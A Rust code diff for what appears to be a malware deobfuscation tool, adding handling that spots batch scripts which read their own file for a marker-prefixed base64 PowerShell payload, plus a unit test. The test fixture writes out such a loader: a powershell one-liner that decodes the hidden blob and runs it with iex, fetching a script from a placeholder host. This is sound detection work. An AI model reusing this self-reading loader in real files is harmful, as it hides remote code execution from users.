@@ -10308,6 +10308,7 @@ fn summarize_self_tail_base64_payloads(text: &str, env: &mut Environment) -> Str
         return text.to_string();
     }
 
+    let marker_prefixes = self_read_base64_marker_prefixes(text);
     let mut changed = false;
     let mut out = String::with_capacity(text.len().min(256 * 1024));
     for line in text.split_inclusive('\n') {
@@ -10320,6 +10321,17 @@ fn summarize_self_tail_base64_payloads(text: &str, env: &mut Environment) -> Str
         if !(MIN_B64_RUN..=MAX_B64_RUN).contains(&candidate.len())
             || !candidate.bytes().all(is_base64_carrier_byte)
         {
+            if summarize_marker_prefixed_self_read_base64_line(
+                body,
+                newline,
+                trimmed,
+                &marker_prefixes,
+                env,
+                &mut out,
+            ) {
+                changed = true;
+                continue;
+            }
             out.push_str(line);
             continue;
         }
@@ -10327,16 +10339,38 @@ fn summarize_self_tail_base64_payloads(text: &str, env: &mut Environment) -> Str
         use base64::Engine as _;
         let decoded = if was_capped {
             None
-        } else {
-            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(candidate) else {
-                out.push_str(line);
-                continue;
-            };
-            if decoded.len() > 12 * 1024 * 1024 || !looks_like_powershell_payload_bytes(&decoded) {
+        } else if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(candidate) {
+            if decoded.len() <= 12 * 1024 * 1024 && looks_like_powershell_payload_bytes(&decoded) {
+                Some(decoded)
+            } else {
+                if summarize_marker_prefixed_self_read_base64_line(
+                    body,
+                    newline,
+                    trimmed,
+                    &marker_prefixes,
+                    env,
+                    &mut out,
+                ) {
+                    changed = true;
+                    continue;
+                }
                 out.push_str(line);
                 continue;
             }
-            Some(decoded)
+        } else {
+            if summarize_marker_prefixed_self_read_base64_line(
+                body,
+                newline,
+                trimmed,
+                &marker_prefixes,
+                env,
+                &mut out,
+            ) {
+                changed = true;
+                continue;
+            }
+            out.push_str(line);
+            continue;
         };
         if was_capped
             && !env
@@ -10375,6 +10409,70 @@ fn summarize_self_tail_base64_payloads(text: &str, env: &mut Environment) -> Str
     } else {
         text.to_string()
     }
+}
+
+fn summarize_marker_prefixed_self_read_base64_line(
+    body: &str,
+    newline: &str,
+    trimmed: &str,
+    marker_prefixes: &[String],
+    env: &mut Environment,
+    out: &mut String,
+) -> bool {
+    const MIN_B64_RUN: usize = 80;
+    const MAX_B64_RUN: usize = 16 * 1024 * 1024;
+
+    let Some((marker, b64)) = marker_prefixes.iter().find_map(|marker| {
+        let b64 = trimmed.strip_prefix(marker)?;
+        ((MIN_B64_RUN..=MAX_B64_RUN).contains(&b64.len())
+            && b64.bytes().all(is_base64_carrier_byte))
+        .then_some((marker, b64))
+    }) else {
+        return false;
+    };
+
+    use base64::Engine as _;
+    let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
+        return false;
+    };
+    if decoded.len() > 12 * 1024 * 1024 || !looks_like_powershell_payload_bytes(&decoded) {
+        return false;
+    }
+
+    let leading_len = body.find(trimmed).unwrap_or(0);
+    out.push_str(&body[..leading_len]);
+    out.push_str(&format!(
+        "::==== harrington: omitted self-read base64 marker payload ({} marker bytes, {} bytes encoded, {} bytes decoded) ====",
+        marker.len(),
+        b64.len(),
+        decoded.len()
+    ));
+    out.push_str(newline);
+    rescue_truncated_urls(&String::from_utf8_lossy(&decoded), body.len(), env);
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: body.len() as u64,
+    });
+    true
+}
+
+fn self_read_base64_marker_prefixes(text: &str) -> Vec<String> {
+    let Ok(re) =
+        regex::Regex::new(r#"(?is)-match\s*['"]([^'"]{4,200}?)\(\[A-Za-z0-9\+/\=\]\+\)['"]"#)
+    else {
+        return Vec::new();
+    };
+    let mut markers = Vec::new();
+    for caps in re.captures_iter(text) {
+        let Some(marker) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        if marker.bytes().all(is_base64_carrier_byte)
+            && !markers.iter().any(|existing: &String| existing == marker)
+        {
+            markers.push(marker.to_string());
+        }
+    }
+    markers
 }
 
 fn looks_like_self_tail_base64_loader_text(text: &str) -> bool {
@@ -25465,6 +25563,52 @@ powershell -NoP -C "try {{ $Natural = (Get-Content '%~f0') -join [Environment]::
             }),
             "embedded self-read payload URL was not extracted: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_self_read_marker_base64_carrier_line_is_summarized_without_losing_payload() {
+        use base64::Engine;
+        let marker = "remoK3Z8Q5FIG2qXL6SsHa7";
+        let payload = format!(
+            "$u='https://selfread-marker-long.example/FLEE.ps1'; Invoke-WebRequest -Uri $u;#{}",
+            "A".repeat(8_192)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+        let script = format!(
+            r#"@echo off
+powershell -NoP -C "try {{ $sweep = Get-Content '%~f0' -Raw; if ($sweep -match '{marker}([A-Za-z0-9+/=]+)') {{ [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($matches[1])) | iex }} }} catch {{}}"
+exit /b
+{marker}{b64}
+"#
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://selfread-marker-long.example/FLEE.ps1")),
+            "marker self-read payload was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. }
+                    if src.contains("selfread-marker-long.example/FLEE.ps1"))
+            }),
+            "marker self-read payload URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("harrington: omitted self-read base64 marker payload"),
+            "marker carrier line was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64),
+            "marker carrier base64 remained in deobfuscated output"
         );
     }
 
